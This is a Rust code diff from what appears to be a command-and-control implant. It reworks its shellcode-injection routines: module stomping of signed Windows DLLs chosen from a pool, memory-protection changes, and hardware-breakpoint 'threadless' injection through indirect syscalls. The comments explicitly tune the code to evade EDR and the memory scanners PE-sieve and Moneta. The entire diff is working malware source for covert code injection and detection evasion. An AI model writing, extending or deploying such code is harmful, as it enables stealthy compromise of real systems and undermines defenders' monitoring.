@@ -573,25 +573,12 @@ unsafe fn stomp_and_resume(
     proc: &SacrificialProcess,
     shellcode: &[u8],
 ) -> Result<(), &'static str> {
-    // Step 1: LoadLibraryA the cover DLL in the target. This writes the DLL
-    // path string into a fresh target allocation (NOT the implant's pointer —
-    // the old skeleton passed a cross-process-invalid pointer), fires
-    // CreateRemoteThread(LoadLibraryA, <target ptr>), and waits for the thread
-    // so LoadLibraryA completes before we parse the freshly-loaded cover.
-    // Cover selection principles: Microsoft-signed, rarely loaded (a clean
-    // .text to stomp), and verified present on the target OS. xpsservices.dll
-    // was confirmed in C:\Windows\System32 on the Win11 24H2 ARM64 test VM
-    // (2026-08-24, 5,219,840 bytes) — a "LoadLibraryA returned NULL" failure
-    // under wine is a wine artifact (the DLL is absent there), not a target
-    // OS absence.
-    let cover_dll = b"xpsservices.dll\0"; // legit, signed, rarely used
-    let cover_base = unsafe { remote_load_library(proc.handle, cover_dll)? };
-    if cover_base == 0 {
-        return Err("remote_load_library: cover base unresolved");
-    }
-    // Step 2: Resolve the cover DLL's REAL .text in the target by reading the
-    // remote PE headers (DOS → NT → section table). base+len are exact.
-    let text = unsafe { remote_text_region(proc.handle, cover_base)? };
+    // Step 1-2: try the cover-DLL pool until LoadLibrary succeeds AND the
+    // remote .text VirtualSize fits the payload. xpsservices.dll stays first
+    // (backward behavior). A wine "LoadLibraryA returned NULL" is a wine
+    // artifact (the DLL is absent there), not a target-OS absence — the
+    // pool continues to the next candidate.
+    let text = unsafe { load_first_suitable_cover(proc, shellcode.len()) }?;
     // Step 3: VirtualProtectEx RX→RWX on the target's .text (real region).
     unsafe {
         remote_protect(proc.handle, text.base, text.len, 0x40 /* RWX */)
@@ -610,7 +597,12 @@ unsafe fn stomp_and_resume(
     //    Check the return — v0.3.0 used 'let _ =' and silently left .text RWX
     //    on failure, which is a louder EDR IOC than the original RX.
     if unsafe {
-        remote_protect(proc.handle, text.base, text.len, 0x20 /* ER */)
+        remote_protect(
+            proc.handle,
+            text.base,
+            text.len,
+            crate::stealth::desired_final_protect(),
+        )
     }
     .is_err()
     {
@@ -622,6 +614,49 @@ unsafe fn stomp_and_resume(
     //    module_stomp's cleanup (terminate + close both handles) must own it.
     unsafe { resume_thread(proc.main_thread) }?;
     Ok(())
+}
+
+/// First cover-DLL in [`crate::stealth::COVER_DLL_POOL`] whose remote LoadLibrary
+/// returns non-zero and whose `.text` VirtualSize is >= `shellcode_len`.
+/// Returns the last pool error if every candidate fails.
+unsafe fn load_first_suitable_cover(
+    proc: &SacrificialProcess,
+    shellcode_len: usize,
+) -> Result<RemoteRegion, &'static str> {
+    let mut last: &'static str = "stomp cover pool exhausted";
+    for (i, &dll) in crate::stealth::COVER_DLL_POOL.iter().enumerate() {
+        match unsafe { remote_load_library(proc.handle, dll) } {
+            Ok(base) if base != 0 => match unsafe { remote_text_region(proc.handle, base) } {
+                Ok(text) if text.vsize >= shellcode_len => return Ok(text),
+                Ok(_) => {
+                    last = cover_pool_msg(crate::stealth::COVER_TOO_SMALL, i);
+                }
+                Err(e) => last = e,
+            },
+            Ok(_) => {
+                last = cover_pool_msg(crate::stealth::COVER_LOAD_FAIL, i);
+            }
+            Err(e) => {
+                // LoadLibrary miss → next candidate. Other errors (e.g.
+                // CreateRemoteThread under Prism) keep their original string
+                // so inject_armed's skip match still fires.
+                last = if e.starts_with("LoadLibraryA") {
+                    cover_pool_msg(crate::stealth::COVER_LOAD_FAIL, i)
+                } else {
+                    e
+                };
+            }
+        }
+    }
+    Err(last)
+}
+
+fn cover_pool_msg(table: &[&'static str], i: usize) -> &'static str {
+    if i < table.len() {
+        table[i]
+    } else {
+        "stomp cover pool exhausted"
+    }
 }
 
 // ---- remote helpers (resolved via PEB walk) ----
@@ -1097,6 +1132,7 @@ unsafe fn remote_text_region_section(
         Some(RemoteRegion {
             base: cover_base + vaddr,
             len,
+            vsize,
         })
     } else {
         None
@@ -1106,6 +1142,8 @@ unsafe fn remote_text_region_section(
 struct RemoteRegion {
     base: usize,
     len: usize,
+    /// Real `.text` VirtualSize (not the 0x2000 stomp-window cap).
+    vsize: usize,
 }
 unsafe fn remote_protect(
     h: *mut core::ffi::c_void,
@@ -1164,17 +1202,17 @@ struct AlignedContext([u8; 1232]);
 ///
 /// **Unlike module stomping**, this does NOT overwrite any module's `.text`.
 /// Instead:
-/// 1. Allocate private RWX memory in the target (VirtualAllocEx).
-/// 2. Write shellcode there.
+/// 1. Allocate private RW memory in the target (`NtAllocateVirtualMemory`).
+/// 2. Write shellcode there, then protect the region RX (never leave RWX).
 /// 3. Suspend the target's main thread.
 /// 4. Scan DR0-DR3 for the first unused slot, set DRn = shellcode address.
 /// 5. Resume — the thread hits the HWBP on its next instruction at DRn,
 ///    redirecting execution to the shellcode.
 ///
 /// **PE-sieve clean:** no module `.text` is modified → no hash mismatch.
-/// The shellcode runs from private RWX memory (Moneta may flag this as
+/// The shellcode runs from private RX memory (Moneta may flag this as
 /// "private executable", but it's NOT "unbacked" in the PE-sieve sense —
-/// PE-sieve's primary scan doesn't check private RWX unless deep-scan is on).
+/// PE-sieve's primary scan doesn't check private RX unless deep-scan is on).
 ///
 /// **Limitation:** x64 has only 4 HWBP slots (DR0-DR3). If the target thread
 /// already uses all 4, injection fails with an error. The code scans for the
@@ -1219,14 +1257,16 @@ pub unsafe fn threadless_inject(
     unsafe { threadless_inject_apply(rt, main_thread, &mut ctx) }
 }
 
-/// Steps 1-2: allocate RWX in the target for the shellcode and write it via
-/// indirect syscalls. Returns the remote shellcode base.
-unsafe fn threadless_inject_alloc(
+/// Steps 1-2: allocate RW in the target, write the shellcode, then protect
+/// RX. Fail-closed: never return success with the region still RWX.
+/// `pub(crate)` so `nyx_selftest_inject_threadless` can exercise the safe
+/// prefix without RIP-hijacking.
+pub(crate) unsafe fn threadless_inject_alloc(
     rt: &'static nyx_implant_core::syscalls::Runtime,
     proc_handle: *mut core::ffi::c_void,
     shellcode: &[u8],
 ) -> Result<usize, &'static str> {
-    // 1. Allocate RWX in target for shellcode.
+    // 1. Allocate RW (not RWX) in target for shellcode.
     let mut remote_base: usize = 0;
     let mut region_size: usize = shellcode.len();
     let alloc_status = unsafe {
@@ -1237,7 +1277,7 @@ unsafe fn threadless_inject_alloc(
             &mut remote_base,
             &mut region_size,
             0x3000, // MEM_COMMIT | MEM_RESERVE
-            0x40,   // PAGE_EXECUTE_READWRITE
+            crate::stealth::payload_alloc_protect(),
         )
     };
     match alloc_status {
@@ -1260,6 +1300,26 @@ unsafe fn threadless_inject_alloc(
     match write_status {
         Some(s) if s >= 0 => {}
         _ => return Err("NtWriteVirtualMemory shellcode failed"),
+    }
+
+    // 3. RW → RX before RIP hijack. Mirror stomp_and_resume: a silent
+    //    protect failure would leave private RWX, a louder IOC than RX.
+    let mut prot_base = remote_base;
+    let mut prot_size = region_size;
+    let mut old_prot: u32 = 0;
+    let prot_status = unsafe {
+        nyx_implant_core::syscalls::nt_protect_virtual_memory_process(
+            rt,
+            proc_handle as usize,
+            &mut prot_base,
+            &mut prot_size,
+            crate::stealth::desired_final_protect(),
+            &mut old_prot,
+        )
+    };
+    match prot_status {
+        Some(s) if s >= 0 => {}
+        _ => return Err("NtProtectVirtualMemory RW→RX failed"),
     }
     Ok(remote_base)
 }
@@ -1730,7 +1790,9 @@ fn do_inject_sacrificial_fls(
                             msg.push(')');
                             nyx_protocol::Response::Output(msg.into_bytes())
                         }
-                        Err(e) => nyx_protocol::Response::Err(nyx_implant_core::heap::String::from(e)),
+                        Err(e) => {
+                            nyx_protocol::Response::Err(nyx_implant_core::heap::String::from(e))
+                        }
                     }
                 }
                 Err(e) => nyx_protocol::Response::Err(nyx_implant_core::heap::String::from(e)),
